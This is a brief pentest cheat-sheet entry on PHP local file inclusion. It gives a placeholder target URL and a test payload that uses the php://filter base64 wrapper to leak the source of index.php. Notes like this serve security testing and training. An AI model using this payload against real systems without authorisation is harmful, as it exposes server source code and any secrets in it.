# LFI PHP

### Situation

`http://<target>/index.php?parameter=value`

### Test

`http://<target>/index.php?parameter=php://filter/convert.base64-encode/resource=index`

### Take a look at the bloody thing

